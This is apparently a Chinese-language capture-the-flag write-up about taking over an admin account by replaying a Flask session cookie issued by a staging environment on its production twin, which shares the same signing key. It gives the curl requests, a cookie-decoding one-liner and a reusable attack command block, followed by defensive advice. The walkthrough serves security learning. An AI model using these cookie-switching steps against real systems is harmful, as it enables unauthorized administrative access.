# 09 · 0-Click Account Takeover via Cookie Switching —— 压轴：两个错误叠加成的接管

> 系列第 9 题 · 对应真实事件：跨环境会话管理不当导致无需用户交互的完整账户接管
>（原赏金 $20,000）· 我的净耗时：约 15 分钟

## 题面

> You've discovered a router reseller company running both staging and
> production environments. But are they really separate?
> Your mission: explore both environments, understand how sessions are handled
> and break into production.

靶场地址：**两套环境**——`https://stage.<REDACTED_DOMAIN>/` 与
`https://prod.<REDACTED_DOMAIN>/`

## 我的判断路径

"staging 和 production 真的是隔离的吗？"——这类题的检验清单：

1. 两套环境的差异面（路由、功能、配置）
2. 会话载体是什么（cookie？token？），由谁签发、谁验证
3. **一方的凭据拿到另一方是否依然有效**

前置侦察（第 2 题建立的 CT 日志战场地图）早就显示这两个子域名同属一套基础设施，
所以第 3 步是我开局的主假设。

## 过程

### 1. 双环境差异侦察

| | staging | production |
|---|---|---|
| 首页标记 | 醒目的 "STAGING ENVIRONMENT" 横幅 | 无 |
| 登录入口 | `/login` + **`/guest-login`**（额外） | 仅 `/login` |
| 未登录访问 `/dashboard` | 302 → `/login` | 302 → `/login` |

staging 独有的 `/guest-login` 就是入口。

### 2. 一个 GET 白拿的会话

```
GET https://stage.<REDACTED_DOMAIN>/guest-login

→ HTTP 302 (Location: /dashboard)
  Set-Cookie: session=<REDACTED_TOKEN>; HttpOnly; Path=/
```

不需要任何凭据，一个 GET 请求就拿到了带完整会话的 cookie。
格式是 Flask 框架经典的 `payload.timestamp.signature` 三段式签名 cookie，
首部带 `.` 说明 payload 经过了 zlib 压缩。

### 3. 解码会话：第一个错误浮出水面

```bash
# base64url 解码 + zlib 解压（Python 一行）
python3 -c "import base64,zlib;print(zlib.decompress(base64.urlsafe_b64decode('<payload>')).decode())"
```

```json
{"environment": "staging", "name": "Guest User", "role": "admin", "user": "guest"}
```

**staging 的 guest 账号，角色是 `admin`。** 测试环境图省事给游客发管理员权限，
这是第一个错误。

### 4. Cookie 切换：第二个错误完成接管

现在验证我的主假设——把这个 staging 签发的 cookie 原样带到 production：

```bash
curl -H "Cookie: session=<REDACTED_TOKEN>" \
     https://prod.<REDACTED_DOMAIN>/dashboard

→ HTTP 200
  "Welcome, Guest User!" + ADMIN 徽章 + flag（<REDACTED>）
```

**production 完整接受了 staging 签发的管理员会话。** 两个环境共用同一个
Flask SECRET_KEY，签名互相认可——会话隔离形同虚设。这是第二个错误。

### 为什么叫"0-Click"

被接管的一方（production 里的真实用户/管理员）**不需要点任何东西、不需要任何操作**：
攻击者在 staging 自助"铸造"一枚 admin 会话，拿到 production 就是管理员。
受害者全程无感知，连被攻击的痕迹都没有。

## 漏洞结构（复盘文章的核心图景）

```
错误①：staging 的 guest 被赋予 role=admin     （权限设计错误）
错误②：两环境共享会话签名密钥                 （环境隔离形同虚设）
              ↓ 叠加
staging 的一个 GET 请求 = production 的管理员会话
```

单独看每个错误都"只是个配置问题"，叠加起来是 $20,000 的完整账户接管——
真实世界的严重漏洞几乎都是这样**多个小错误的组合**，而不是单点大坑。

## 关键命令（脱敏后结构可复用）

```bash
STAGE="https://stage.<REDACTED_DOMAIN>"; PROD="https://prod.<REDACTED_DOMAIN>"

curl -D - -o /dev/null "$STAGE/guest-login"          # 白拿会话（看 Set-Cookie）
python3 -c "…"                                        # 解码 cookie 看角色声明
curl -H "Cookie: session=<REDACTED_TOKEN>" "$PROD/dashboard"   # 切换即接管
```

## 失败与弯路

无返工。前置情报（CT 日志里的双子域名）+ 侦察清单让路径几乎是直线。
这也验证了方法论的价值：**压轴题反而是后半程最快的三题之一**——
因为到第 9 题时，"先看什么、后试什么"已经不需要思考。

## 防御视角（如果我是蓝队）

1. **不同环境必须使用不同的会话签名密钥**——staging 的钥匙开不了 production 的锁，
   这应该是环境初始化的硬性检查项
2. 测试环境也不该有"guest = admin"的捷径；测试需要高权限就显式登录高权限账号
3. 会话声明里的 `environment` 字段应该在服务端强制校验，而不是只写进 cookie 当摆设
4. Flask/Django 类"签名不加密"的会话机制要牢记：**内容对任何人可读，仅防篡改**；
   密钥一旦共享或泄露，伪造即合法

## 证据

- `evidence/09-1-flag-submitted.png` —— 提交成功页面（全系列最后一题，9/9）
